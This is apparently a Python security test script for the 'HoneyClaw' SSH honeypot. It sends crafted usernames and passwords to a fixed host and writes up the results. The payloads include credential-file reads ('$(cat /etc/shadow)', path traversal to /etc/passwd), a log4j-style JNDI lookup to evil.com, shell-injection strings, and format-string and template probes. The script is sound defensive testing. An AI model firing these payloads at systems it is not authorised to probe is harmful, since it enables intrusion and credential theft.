#!/usr/bin/env python3
"""
HoneyClaw Input Validation Tests (I-01 to I-07)
Tests for buffer overflows, injection attacks, and input sanitization

Usage:
    python test_input_validation.py [HOST] [PORT]
    python test_input_validation.py 149.248.202.23 8022
"""

import argparse
import asyncio
import asyncssh
import socket
import time
import json
from datetime import datetime

TARGET_HOST = "149.248.202.23"
TARGET_PORT = 8022
TIMEOUT = 10

# Connection outcome categories (not all resets are crashes)
OUTCOME_CONNECTED = "connected"          # SSH auth completed (unexpected for honeypot)
OUTCOME_AUTH_REJECTED = "auth_rejected"  # Proper auth rejection (PermissionDenied)
OUTCOME_PROTOCOL_ERROR = "protocol_error"  # SSH protocol error (DisconnectError)
OUTCOME_CONN_RESET = "conn_reset"        # Connection reset (may be KEX failure or rate limit)
OUTCOME_CONN_REFUSED = "conn_refused"    # Server not accepting connections
OUTCOME_TIMEOUT = "timeout"             # Connection or response timed out
OUTCOME_APP_ERROR = "app_error"          # Application-level error (SASLPrep, etc.)

results = []

def record_result(test_id, name, payload_desc, payload_sample, response, outcome, injection_evidence, notes):
    """Record test result.

    Args:
        outcome: One of OUTCOME_* constants. Describes what happened:
            - OUTCOME_AUTH_REJECTED: Payload reached auth layer and was properly rejected
            - OUTCOME_APP_ERROR: Payload reached app layer and triggered a validation error (e.g. SASLPrep)
            - OUTCOME_CONN_RESET: Connection was reset (likely during KEX, before payload reached validation)
            - OUTCOME_CONN_REFUSED: Server refused connection entirely
            - OUTCOME_TIMEOUT: Connection timed out
            - OUTCOME_PROTOCOL_ERROR: SSH protocol-level disconnect
            - OUTCOME_CONNECTED: Unexpected successful auth
    """
    # Determine if the payload actually reached the validation layer
    reached_validation = outcome in (OUTCOME_AUTH_REJECTED, OUTCOME_APP_ERROR, OUTCOME_CONNECTED)
    server_survived = outcome != OUTCOME_CONN_REFUSED

    results.append({
        "test_id": test_id,
        "name": name,
        "payload_description": payload_desc,
        "payload_sample": payload_sample[:200] if len(payload_sample) > 200 else payload_sample,
        "payload_length": len(payload_sample) if isinstance(payload_sample, (str, bytes)) else "N/A",
        "response": response,
        "outcome": outcome,
        "reached_validation": reached_validation,
        "server_survived": server_survived,
        "injection_evidence": injection_evidence,
        "notes": notes,
        "timestamp": datetime.now().isoformat()
    })
    status_label = {
        OUTCOME_AUTH_REJECTED: "REJECTED",
        OUTCOME_APP_ERROR: "APP_ERROR",
        OUTCOME_CONN_RESET: "CONN_RESET",
        OUTCOME_CONN_REFUSED: "CONN_REFUSED",
        OUTCOME_TIMEOUT: "TIMEOUT",
        OUTCOME_PROTOCOL_ERROR: "PROTO_ERROR",
        OUTCOME_CONNECTED: "CONNECTED(!)",
    }.get(outcome, outcome)
    print(f"  [{test_id}] {name}: {status_label} - {notes[:60]}...")

async def test_ssh_auth(username, password, test_name="test"):
    """Attempt SSH authentication and capture response.

    Returns:
        Tuple of (response_str, outcome, injection_evidence)
        where outcome is one of the OUTCOME_* constants.
    """
    try:
        async with asyncssh.connect(
            TARGET_HOST,
            port=TARGET_PORT,
            username=username,
            password=password,
            known_hosts=None,
            preferred_auth=['password'],
            connect_timeout=TIMEOUT
        ) as conn:
            return ("Connected successfully (unexpected!)", OUTCOME_CONNECTED, True)
    except asyncssh.PermissionDenied as e:
        return (f"PermissionDenied: {str(e)[:100]}", OUTCOME_AUTH_REJECTED, False)
    except asyncssh.DisconnectError as e:
        return (f"DisconnectError: {str(e)[:100]}", OUTCOME_PROTOCOL_ERROR, False)
    except asyncssh.ConnectionLost as e:
        return (f"ConnectionLost: {str(e)[:100]}", OUTCOME_CONN_RESET, False)
    except asyncssh.HostKeyNotVerifiable as e:
        return (f"HostKeyNotVerifiable: {str(e)[:100]}", OUTCOME_PROTOCOL_ERROR, False)
    except socket.timeout:
        return ("Socket timeout", OUTCOME_TIMEOUT, False)
    except ConnectionRefusedError:
        return ("Connection refused (server may have crashed)", OUTCOME_CONN_REFUSED, False)
    except OSError as e:
        if "reset" in str(e).lower():
            return (f"OSError: {str(e)[:100]}", OUTCOME_CONN_RESET, False)
        return (f"OSError: {str(e)[:100]}", OUTCOME_PROTOCOL_ERROR, False)
    except Exception as e:
        # SASLPrepError and similar validation errors indicate the payload
        # DID reach the application layer and was properly rejected
        if "SASLPrep" in type(e).__name__ or "SASLPrep" in str(e):
            return (f"Exception ({type(e).__name__}): {str(e)[:100]}", OUTCOME_APP_ERROR, False)
        return (f"Exception ({type(e).__name__}): {str(e)[:100]}", OUTCOME_PROTOCOL_ERROR, False)

def check_server_alive():
    """Quick check if server is responding"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        result = sock.connect_ex((TARGET_HOST, TARGET_PORT))
        sock.close()
        return result == 0
    except:
        return False

async def run_tests():
    print("=" * 70)
    print("HoneyClaw Input Validation Security Tests")
    print(f"Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"Started: {datetime.now().isoformat()}")
    print("=" * 70)

    # Pre-check: is server alive?
    if not check_server_alive():
        print("ERROR: Target server not responding!")
        return

    # I-01: Username Overflow
    print("\n[I-01] Username Overflow Test")
    for length in [256, 1024, 4096, 10000, 65536]:
        payload = "A" * length
        response, outcome, injected = await test_ssh_auth(payload, "test", f"overflow_{length}")
        record_result(
            "I-01", f"Username Overflow ({length} chars)",
            f"Username with {length} 'A' characters",
            payload,
            response,
            outcome,
            injected,
            f"Testing buffer overflow with {length} byte username"
        )
        if outcome == OUTCOME_CONN_REFUSED:
            print(f"  WARNING: Server not accepting connections after {length} chars!")
            await asyncio.sleep(2)
            if not check_server_alive():
                print("  CRITICAL: Server not responding!")
                await asyncio.sleep(5)

    # I-02: Password Overflow
    print("\n[I-02] Password Overflow Test")
    for length in [256, 1024, 4096, 10000, 65536]:
        payload = "B" * length
        response, outcome, injected = await test_ssh_auth("testuser", payload, f"pass_overflow_{length}")
        record_result(
            "I-02", f"Password Overflow ({length} chars)",
            f"Password with {length} 'B' characters",
            payload,
            response,
            outcome,
            injected,
            f"Testing buffer overflow with {length} byte password"
        )
        if outcome == OUTCOME_CONN_REFUSED:
            await asyncio.sleep(2)

    # I-03: Null Bytes
    print("\n[I-03] Null Byte Injection Test")
    null_payloads = [
        ("admin\x00root", "null after admin"),
        ("\x00admin", "null prefix"),
        ("admin\x00\x00\x00", "multiple nulls"),
        ("root\x00ignored", "null truncation attempt"),
        ("test\x00$(id)", "null before command"),
    ]
    for payload, desc in null_payloads:
        response, outcome, injected = await test_ssh_auth(payload, "password", f"null_{desc}")
        record_result(
            "I-03", f"Null Byte ({desc})",
            f"Username with null bytes: {desc}",
            repr(payload),
            response,
            outcome,
            injected,
            f"Testing null byte handling: {desc}"
        )

    # I-04: Unicode Exploits
    print("\n[I-04] Unicode Normalization Attack Test")
    unicode_payloads = [
        ("ⓐⓓⓜⓘⓝ", "circled letters (admin)"),
        ("аdmin", "Cyrillic 'a' homoglyph"),
        ("root\u200b", "zero-width space"),
        ("admin\ufeff", "BOM injection"),
        ("r\u0000o\u0000o\u0000t", "wide char simulation"),
        ("admin\u202e\u002e\u002e", "RTL override"),
        ("\u0041\u0308dmin", "combining diacritical"),
        ("ﬁle", "ligature fi"),
        ("../../../etc/passwd", "path traversal"),
        ("admin%00root", "URL-encoded null"),
    ]
    for payload, desc in unicode_payloads:
        response, outcome, injected = await test_ssh_auth(payload, "password", f"unicode_{desc}")
        record_result(
            "I-04", f"Unicode ({desc})",
            f"Username with unicode trick: {desc}",
            repr(payload),
            response,
            outcome,
            injected,
            f"Testing unicode normalization: {desc}"
        )

    # I-05: Log Injection
    print("\n[I-05] Log Injection Test")
    log_payloads = [
        ('{"hack":"test"}\nfake_log', "JSON with newline"),
        ('user\n{"event":"login","success":true}', "fake JSON log entry"),
        ('admin\r\n[INFO] Successful login from trusted\r\n', "CRLF injection"),
        ('test\x1b[31mRED\x1b[0m', "ANSI escape codes"),
        ('user"; DROP TABLE logs; --', "SQL in log"),
        ('${jndi:ldap://evil.com/a}', "log4j style"),
        ('<script>alert(1)</script>', "XSS in logs"),
        ('user\t\t\t\tadmin\t\t\ttrue', "tab injection"),
    ]
    for payload, desc in log_payloads:
        response, outcome, injected = await test_ssh_auth(payload, "password", f"log_{desc}")
        record_result(
            "I-05", f"Log Injection ({desc})",
            f"Username with log injection: {desc}",
            repr(payload),
            response,
            outcome,
            injected,
            f"Testing log injection: {desc}"
        )

    # I-06: Shell Metacharacters
    print("\n[I-06] Shell Metacharacter Test")
    shell_payloads = [
        ("$(whoami)", "command substitution"),
        ("`id`", "backtick execution"),
        ("test;id", "semicolon chaining"),
        ("test|cat /etc/passwd", "pipe injection"),
        ("test&& whoami", "AND chaining"),
        ("test || id", "OR chaining"),
        ("$(cat /etc/shadow)", "shadow file access"),
        ("test$(sleep 5)", "time-based detection"),
        (">>/tmp/pwned", "redirect append"),
        ("test\nid", "newline command"),
    ]
    for payload, desc in shell_payloads:
        start = time.time()
        response, outcome, injected = await test_ssh_auth(payload, "password", f"shell_{desc}")
        elapsed = time.time() - start
        # Check for time-based injection (sleep command)
        time_injection = elapsed > 4 if "sleep" in payload else False
        record_result(
            "I-06", f"Shell Metachar ({desc})",
            f"Username with shell metachar: {desc}",
            repr(payload),
            response + (f" [elapsed: {elapsed:.1f}s]" if "sleep" in payload else ""),
            outcome,
            injected or time_injection,
            f"Testing shell injection: {desc}" + (" - TIME DELAY DETECTED!" if time_injection else "")
        )

    # I-07: Format String
    print("\n[I-07] Format String Attack Test")
    format_payloads = [
        ("%s%s%s%s%n", "basic format string"),
        ("%x%x%x%x", "hex dump"),
        ("%n%n%n%n", "write attempt"),
        ("%.10000s", "precision overflow"),
        ("%p%p%p%p", "pointer leak"),
        ("AAAA%08x.%08x.%08x.%08x", "stack dump"),
        ("%s" * 100, "many %s"),
        ("%d" * 50, "many %d"),
        ("%n" * 10, "many %n (write)"),
        ("${7*7}", "expression evaluation"),
        ("{{7*7}}", "template injection"),
        ("${{7*7}}", "mixed template"),
    ]
    for payload, desc in format_payloads:
        response, outcome, injected = await test_ssh_auth(payload, "password", f"fmt_{desc}")
        record_result(
            "I-07", f"Format String ({desc})",
            f"Username with format string: {desc}",
            repr(payload),
            response,
            outcome,
            injected,
            f"Testing format string vulnerability: {desc}"
        )

    print("\n" + "=" * 70)
    print("Tests completed!")
    print("=" * 70)

def generate_markdown_report():
    """Generate markdown report from results"""
    md = f"""# HoneyClaw Input Validation Test Results

**Target:** {TARGET_HOST}:{TARGET_PORT}
**Test Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
**Total Tests:** {len(results)}

## Summary

| Category | Tests | Reached Validation | Conn Resets | Injection Evidence |
|----------|-------|--------------------|-------------|-------------------|
"""

    # Group by test category
    categories = {}
    for r in results:
        cat = r["test_id"]
        if cat not in categories:
            categories[cat] = {"count": 0, "reached": 0, "resets": 0, "injections": 0, "refused": 0}
        categories[cat]["count"] += 1
        if r["reached_validation"]:
            categories[cat]["reached"] += 1
        if r["outcome"] == OUTCOME_CONN_RESET:
            categories[cat]["resets"] += 1
        if r["outcome"] == OUTCOME_CONN_REFUSED:
            categories[cat]["refused"] += 1
        if r["injection_evidence"]:
            categories[cat]["injections"] += 1

    for cat, stats in sorted(categories.items()):
        md += f"| {cat} | {stats['count']} | {stats['reached']} | {stats['resets']} | {stats['injections']} |\n"

    # Detailed results by category
    md += "\n## Detailed Results\n"

    current_cat = None
    for r in results:
        if r["test_id"] != current_cat:
            current_cat = r["test_id"]
            md += f"\n### {current_cat}: {r['name'].split('(')[0].strip()}\n\n"

        if r["injection_evidence"]:
            status = "⚠️ INJECTION"
        elif r["outcome"] == OUTCOME_AUTH_REJECTED:
            status = "✅ REJECTED (validated)"
        elif r["outcome"] == OUTCOME_APP_ERROR:
            status = "✅ APP_ERROR (validated)"
        elif r["outcome"] == OUTCOME_CONN_RESET:
            status = "⚪ CONN_RESET (inconclusive — payload did not reach validation layer)"
        elif r["outcome"] == OUTCOME_CONN_REFUSED:
            status = "🔴 CONN_REFUSED (server down)"
        elif r["outcome"] == OUTCOME_TIMEOUT:
            status = "🟡 TIMEOUT"
        else:
            status = f"⚪ {r['outcome']}"

        md += f"""#### {r['name']}

- **Status:** {status}
- **Payload Description:** {r['payload_description']}
- **Payload Sample:** `{r['payload_sample']}`
- **Payload Length:** {r['payload_length']}
- **Response:** `{r['response']}`
- **Notes:** {r['notes']}

"""

    # Overall assessment
    total_reached = sum(1 for r in results if r["reached_validation"])
    total_resets = sum(1 for r in results if r["outcome"] == OUTCOME_CONN_RESET)
    total_injections = sum(1 for r in results if r["injection_evidence"])
    total_refused = sum(1 for r in results if r["outcome"] == OUTCOME_CONN_REFUSED)

    md += f"""## Overall Assessment

### Result Breakdown
- **Total Tests:** {len(results)}
- **Reached Validation Layer:** {total_reached} (confirmed pass/fail)
- **Connection Resets (inconclusive):** {total_resets} (payload never reached validation — likely KEX failure)
- **Connection Refused:** {total_refused} (server unavailable)
- **Injection Evidence:** {total_injections}

### Interpretation

"""
    if total_resets > 0:
        md += f"""**Important:** {total_resets} of {len(results)} tests resulted in connection resets during the SSH key exchange phase, **before the payload reached the input validation layer**. These results are inconclusive — the server did not crash (it remained available for subsequent tests), but the payloads were never actually processed by the validation code. These tests should be re-run after the SSH handshake implementation is fixed.

"""
    if total_reached > 0 and total_injections == 0:
        md += f"""Of the {total_reached} tests that reached the application layer, all were properly handled with no injection evidence.

"""
    if total_injections > 0:
        md += f"**{total_injections} test(s) showed potential injection evidence — see details above.**\n\n"

    md += f"""
### Test Payloads Sent

| Test | Payload Type | Example |
|------|--------------|---------|
| I-01 | Username Overflow | `AAAA...` (up to 65536 chars) |
| I-02 | Password Overflow | `BBBB...` (up to 65536 chars) |
| I-03 | Null Bytes | `admin\\x00root` |
| I-04 | Unicode | `аdmin` (Cyrillic) |
| I-05 | Log Injection | `{{"hack":"test"}}\\nfake_log` |
| I-06 | Shell Metachar | `$(whoami)` |
| I-07 | Format String | `%s%s%s%s%n` |

---
*Report generated by HoneyClaw security test suite*
"""
    return md

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HoneyClaw Input Validation Tests")
    parser.add_argument("host", nargs="?", default=TARGET_HOST, help="Target host (default: %(default)s)")
    parser.add_argument("port", nargs="?", type=int, default=TARGET_PORT, help="Target port (default: %(default)s)")
    parser.add_argument("-o", "--output", default=None, help="Output report path (default: ./input-validation.md)")
    args = parser.parse_args()
    TARGET_HOST = args.host
    TARGET_PORT = args.port

    asyncio.run(run_tests())

    # Generate and save report
    report = generate_markdown_report()
    output_path = args.output or "input-validation.md"
    with open(output_path, "w") as f:
        f.write(report)

    total_reached = sum(1 for r in results if r["reached_validation"])
    total_resets = sum(1 for r in results if r["outcome"] == OUTCOME_CONN_RESET)
    print(f"\nReport written to: {output_path}")
    print(f"Total tests: {len(results)}")
    print(f"Reached validation layer: {total_reached}")
    print(f"Connection resets (inconclusive): {total_resets}")
    print(f"Injections: {sum(1 for r in results if r['injection_evidence'])}")
